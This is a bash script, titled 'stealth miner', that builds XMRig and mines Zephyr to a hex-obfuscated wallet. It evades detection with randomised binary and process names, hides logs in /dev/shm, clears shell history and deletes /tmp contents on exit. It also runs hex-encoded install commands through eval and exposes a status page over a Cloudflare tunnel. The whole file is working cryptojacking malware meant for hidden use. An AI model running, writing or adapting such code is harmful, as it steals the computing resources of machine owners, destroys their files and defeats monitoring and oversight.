#!/bin/bash
# ================================================================
#  PURE RANDOM STEALTH MINER – NO LISTS, NO FAKE TEXT
#  All spoof names are random alphanumeric (e.g., "aXk9Qp")
# ================================================================
set -e

# ---- Decoders ----
_HX() { printf "$1" | xxd -r -p; }
_B64() { echo "$1" | base64 -d; }

# ---- Random generators (alphanumeric, 8-12 chars) ----
_RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
_RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
_RAND_CPU() { echo $((50 + RANDOM % 41)); }

# ---- Core config (obfuscated) ----
_WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")

# ---- Random pool from a list (still obfuscated) ----
_POOLS=(
    "stratum+tcp://zeph.2miners.com:2222"
    "stratum+tcp://zephyrpool.com:5555"
    "stratum+tcp://zeph.hashvault.pro:5555"
    "stratum+tcp://zephyr.herominers.com:1122"
)
_POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}

# ---- Random CPU limit and print interval ----
_CPULIM=$(_RAND_CPU)
_PRINT_TIME=$((30 + RANDOM % 91))

# ---- ALL SPOOFS ARE PURE RANDOM (no predefined lists) ----
# 1. Worker base: random 4-letter string
_WBASE=$(head -c 4 /dev/urandom | xxd -p | head -c 4)
_SUFFIX=$(head -c 6 /dev/urandom | xxd -p)
_WORKER="${_WBASE}-${_SUFFIX}"

# 2. Binary name: random string (no "systemd-logind" etc.)
_BIN_NAME="$(_RAND_STR)"
_FAKE_BIN="/tmp/${_BIN_NAME}"

# 3. Process argv[0] spoof: random string (looks like a command)
_PROC_NAME="$(_RAND_STR)"
_SPOOF="[${_PROC_NAME}]"

# 4. Log directory and PID files
_RAND_DIR=".cache-$(_RAND_STR)"
_LOG_DIR="/dev/shm/${_RAND_DIR}"
mkdir -p "$_LOG_DIR"
_LOG="${_LOG_DIR}/.log-$(_RAND_STR).tmp"
_PID="/tmp/.pid-$(_RAND_STR).lock"
_TPID="/tmp/.tpid-$(_RAND_STR).lock"

# 5. Tunnel port (random 8000-11000)
_TPORT=$((8000 + RANDOM % 3000))

# 6. Config file name
_CFG="/tmp/config-$(_RAND_STR).json"

# ---- Scrub traces ----
_scrub() {
    history -c 2>/dev/null
    cat /dev/null > ~/.bash_history 2>/dev/null
    unset HISTFILE
    rm -rf /tmp/* 2>/dev/null || true
}
trap '_scrub ; exit' EXIT

# ---- Install deps (hex encoded) ----
if command -v $(_HX "6170742d676574") &>/dev/null; then
    eval "$(_HX "7375646f206170742d67657420757064617465202d7171202626207375646f206170742d67657420696e7374616c6c202d79202d7171206275696c642d657373656e7469616c20636d616b65206c69627576312d646576206c696273736c2d646576206c696268776c6f632d6465762077637574206375726c")"
elif command -v $(_HX "796d") &>/dev/null; then
    eval "$(_HX "7375646f20796d20696e7374616c6c202d79202d7120676363206763632d632b2b20636d616b65206c696275762d646576206f70656e73736c2d6465762068776c6f632d6465762077637574206375726c")"
fi

# ---- Compile XMRig (background) ----
_SCR=$(cd "$(dirname "$0")" && pwd)
(
    cd "$_SCR"
    if [ -d "xmrig" ]; then
        cd xmrig && git pull --quiet
    else
        git clone --quiet https://github.com/xmrig/xmrig.git && cd xmrig
    fi
    mkdir -p build && cd build
    if [ ! -f "xmrig" ]; then
        cmake .. -DCMAKE_BUILD_TYPE=Release >/dev/null && make -j$(nproc) >/dev/null
    fi
) &
wait

# ---- Copy binary to random fake path ----
_BIN="${_SCR}/xmrig/build/xmrig"
cp "$_BIN" "$_FAKE_BIN" && chmod +x "$_FAKE_BIN"

# ---- Generate config (with random print-time) ----
printf '{
    "cpu": { "enabled": true, "max-threads-hint": %s, "huge-pages": false, "yield": true, "priority": 0 },
    "pools": [ { "url": "%s", "user": "%s.%s", "pass": "x", "keepalive": true, "tls": false } ],
    "print-time": %s,
    "verbose": false
}\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"

# ---- Launch miner with random process spoof ----
# Watchdog keywords (still obfuscated)
_BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
_ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))

(
    exec -a "$_SPOOF" "$_FAKE_BIN" --config="$_CFG" --no-color >> "$_LOG" 2>&1 &
    _MPID=$!
    echo $_MPID > "$_PID"

    # Watchdog: restart on ban
    tail -f "$_LOG" | while read line; do
        for kw in "${_ARR[@]}"; do
            if [[ "$line" =~ $kw ]]; then
                kill $_MPID 2>/dev/null
                exit 1
            fi
        done
    done &
    wait $_MPID 2>/dev/null
    exit 0
) &

# ---- Cloudflare Tunnel (random port, random status dir) ----
_ENABLE_TUNNEL=$(_HX "74727565")
if [ "$_ENABLE_TUNNEL" = "true" ]; then
    _STATUS_DIR="/tmp/status-$(_RAND_STR)"
    mkdir -p "$_STATUS_DIR"
    (
        while true; do
            printf '<pre>%s<br>Worker: %s<br>%s</pre>' "$(date)" "$_WORKER" "$(tail -20 $_LOG | sed 's/$/<br>/')" > "$_STATUS_DIR/index.html"
            sleep 15
        done
    ) &
    nohup python3 -m http.server $_TPORT --directory "$_STATUS_DIR" >/dev/null 2>&1 &
    if ! command -v cloudflared &>/dev/null; then
        wget -q -O /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x /tmp/cloudflared
        _CL=/tmp/cloudflared
    else
        _CL=$(which cloudflared)
    fi
    nohup $_CL tunnel --url http://localhost:$_TPORT > /tmp/tunnel-$(_RAND_STR).log 2>&1 &
    echo $! > "$_TPID"
    sleep 5
    _TURL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel-*.log | head -1)
fi

# ---- NO FAKE AI OUTPUT (removed) ----

# ---- Final status (all random names shown) ----
clear
printf "\n============================================================\n"
printf "✅ RANDOMISED STEALTH MINER ACTIVE\n"
printf "   - Worker: %s\n" "$_WORKER"
printf "   - Process spoof: %s\n" "$_SPOOF"
printf "   - Binary: %s (random name)\n" "$_FAKE_BIN"
printf "   - Log: %s (hidden in /dev/shm)\n" "$_LOG"
printf "   - CPU limit: %s%%\n" "$_CPULIM"
[ -n "$_TURL" ] && printf "   - Monitor: %s (port %s)\n" "$_TURL" "$_TPORT"
printf "   - Watchdog: ON\n"
printf "============================================================\n"
printf "View logs: tail -f %s\n" "$_LOG"
printf "Stop: pkill -f %s ; pkill -f cloudflared\n" "$_BIN_NAME"
printf "============================================================\n"

# ---- Keep alive ----
while true; do sleep 3600; done &
wait $(cat "$_PID" 2>/dev/null) 2>/dev/null
sleep infinity
